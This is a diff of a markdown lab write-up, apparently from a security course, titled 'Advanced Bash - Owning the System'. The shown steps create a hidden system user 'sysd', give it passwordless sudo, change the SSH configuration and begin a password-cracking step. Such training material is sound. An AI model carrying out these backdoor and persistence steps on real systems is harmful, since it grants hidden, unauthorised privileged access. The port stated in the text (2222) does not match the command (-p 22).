@@ -1,6 +1,6 @@
 # Advanced Bash - Owning the System
 
-Step 1: Shadow People
+## Step 1: Shadow People
 - 1. Create a secret user named sysd. Make sure this user doesn't have a home folder created:
   - sudo useradd --system --no-create-home sysd
 
@@ -21,7 +21,7 @@ Step 1: Shadow People
 - 4. Give your secret user the same GID:
     - sudo groupmod -g 997 sysd
 
-![](/Linux/Images/AB-3-gid.png)
+![](/Linux/Images/AB-4-gid.png)
 
 - 5. Give your secret user full sudo access without the need for a password:
     - sudo visudo
@@ -35,7 +35,7 @@ Step 1: Shadow People
 ![](/Linux/Images/AB-6-test-access.png)
 
 
-Step 2: Smooth Sailing
+## Step 2: Smooth Sailing
 - 1. Edit the sshd_config file:
   - sudo nano /etc/ssh/sshd_config
 
@@ -44,7 +44,7 @@ Step 2: Smooth Sailing
 ![](/Linux/Images/AB-2.1-nano.png)
 
 
-Step 3: Testing Your Configuration Update
+## Step 3: Testing Your Configuration Update
 - 1. Restart the SSH service:
   - systemctl restart ssh
 
@@ -66,7 +66,7 @@ Step 3: Testing Your Configuration Update
 
 
 
-Step 4: Crack All the Passwords
+## Step 4: Crack All the Passwords
 - 1. SSH back to the system using your sysd account and port 2222:
   - ssh sysd@192.168.1.23 -p 22
 
